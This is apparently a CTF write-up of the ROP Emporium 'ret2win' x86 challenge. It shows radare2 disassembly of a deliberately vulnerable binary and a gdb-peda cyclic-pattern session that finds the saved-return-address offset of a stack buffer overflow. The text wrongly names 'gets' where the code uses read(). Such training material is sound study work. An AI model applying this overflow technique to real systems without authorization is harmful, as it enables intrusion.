We can use radare2 to find if there exist vulnerability.
```
└─$ r2 ret2win32
[0x08048430]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Finding and parsing C++ vtables (avrr)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information (aanr)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x08048430]> afl
0x08048430    1 51           entry0
0x08048463    1 4            fcn.08048463
0x080483f0    1 6            sym.imp.__libc_start_main
0x08048490    4 50   -> 41   sym.deregister_tm_clones
0x080484d0    4 58   -> 54   sym.register_tm_clones
0x08048510    3 34   -> 31   sym.__do_global_dtors_aux
0x08048540    1 6            entry.init0
0x080485ad    1 127          sym.pwnme
0x08048410    1 6            sym.imp.memset
0x080483d0    1 6            sym.imp.puts
0x080483c0    1 6            sym.imp.printf
0x080483b0    1 6            sym.imp.read
0x0804862c    1 41           sym.ret2win
0x080483e0    1 6            sym.imp.system
0x080486c0    1 2            sym.__libc_csu_fini
0x08048480    1 4            sym.__x86.get_pc_thunk.bx
0x080486c4    1 20           sym._fini
0x08048660    4 93           sym.__libc_csu_init
0x08048470    1 2            sym._dl_relocate_static_pie
0x08048546    1 103          main
0x08048400    1 6            sym.imp.setvbuf
0x08048374    3 35           sym._init
0x08048420    1 6            sym..plt.got
[0x08048430]> pdd @main
/* r2dec pseudo code output */
/* ret2win32 @ 0x8048546 */
#include <stdint.h>
 
int32_t main (char ** argv) {
    int32_t var_4h;
    ecx = esp + 4;
    eax = stdout;
    setvbuf (eax, 0, 2, 0);
    puts ("ret2win by ROP Emporium");
    puts ("x86\n");
    pwnme ();
    puts ("\nExiting");
    eax = 0;
    ecx = *((ebp - 4));
    esp = ecx - 4;
    return eax;
}
[0x08048430]> pdd @sym.pwnme
/* r2dec pseudo code output */
/* ret2win32 @ 0x80485ad */
#include <stdint.h>
 
uint32_t pwnme (void) {
    void * s;
    memset (ebp - 0x28, 0, 0x20);
    puts ("For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!");
    puts ("What could possibly go wrong?");
    puts ("You there, may I have your input please? And don't worry about null bytes, we're using read()!\n");
    printf (0x80487e8);
    read (0, ebp - 0x28, 0x38);
    puts ("Thank you!");
    return eax;
}
[0x08048430]> afl
0x08048430    1 51           entry0
0x08048463    1 4            fcn.08048463
0x080483f0    1 6            sym.imp.__libc_start_main
0x08048490    4 50   -> 41   sym.deregister_tm_clones
0x080484d0    4 58   -> 54   sym.register_tm_clones
0x08048510    3 34   -> 31   sym.__do_global_dtors_aux
0x08048540    1 6            entry.init0
0x080485ad    1 127          sym.pwnme
0x08048410    1 6            sym.imp.memset
0x080483d0    1 6            sym.imp.puts
0x080483c0    1 6            sym.imp.printf
0x080483b0    1 6            sym.imp.read
0x0804862c    1 41           sym.ret2win
0x080483e0    1 6            sym.imp.system
0x080486c0    1 2            sym.__libc_csu_fini
0x08048480    1 4            sym.__x86.get_pc_thunk.bx
0x080486c4    1 20           sym._fini
0x08048660    4 93           sym.__libc_csu_init
0x08048470    1 2            sym._dl_relocate_static_pie
0x08048546    1 103          main
0x08048400    1 6            sym.imp.setvbuf
0x08048374    3 35           sym._init
0x08048420    1 6            sym..plt.got
[0x08048430]> pdd @sym.ret2win
/* r2dec pseudo code output */
/* ret2win32 @ 0x804862c */
#include <stdint.h>
 
void ret2win (void) {
    puts ("Well done! Here's your flag:");
    system ("/bin/cat flag.txt");
}
```
Then, we can find that there is a serious vulnerability in the "gets", because the size that can be input is greater than its own length.


```
gdb-peda$ pattern create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ r
Starting program: /home/kali/Desktop/github/ROP-Emporium-writeup/ret2win/x86/ret2win32 
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
Thank you!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0x1 
EDI: 0x8048430 (<_start>:       xor    ebp,ebp)
EBP: 0x41304141 ('AA0A')
ESP: 0xffffcfe0 ("bAA1AAGA")
EIP: 0x41414641 ('AFAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414641
[------------------------------------stack-------------------------------------]
0000| 0xffffcfe0 ("bAA1AAGA")
0004| 0xffffcfe4 ("AAGA")
0008| 0xffffcfe8 --> 0x0 
0012| 0xffffcfec --> 0xf7dd9905 (<__libc_start_main+229>:       add    esp,0x10)
0016| 0xffffcff0 --> 0x1 
0020| 0xffffcff4 --> 0x8048430 (<_start>:       xor    ebp,ebp)
0024| 0xffffcff8 --> 0x0 
0028| 0xffffcffc --> 0xf7dd9905 (<__libc_start_main+229>:       add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414641 in ?? ()
gdb-peda$ AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
Undefined command: "AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA".  Try "help".
gdb-peda$ pattern offset
Error: missing argument
Generate, search, or write a cyclic pattern to memory
Set "pattern" option for basic/extended pattern type
Usage:
    pattern create size [file]
    pattern offset value
    pattern search
    pattern patch address size
    pattern arg size1 [size2,offset2]
    pattern env size[,offset]

gdb-peda$ pattern offset0x41304141
Error: missing argument
Generate, search, or write a cyclic pattern to memory
Set "pattern" option for basic/extended pattern type
Usage:
    pattern create size [file]
    pattern offset value
    pattern search
    pattern patch address size
    pattern arg size1 [size2,offset2]
    pattern env size[,offset]

gdb-peda$ pattern offset 0x41304141
1093681473 found at offset: 40
gdb-peda$ pattern offset 0x41414641
1094796865 found at offset: 44
gdb-peda$ pattern offset 0xffffcfe0
4294954976 not found in pattern buffer
gdb-peda$ pattern offset bAA1AAGA
bAA1AAGA found at offset: 48
gdb-peda$ q
```
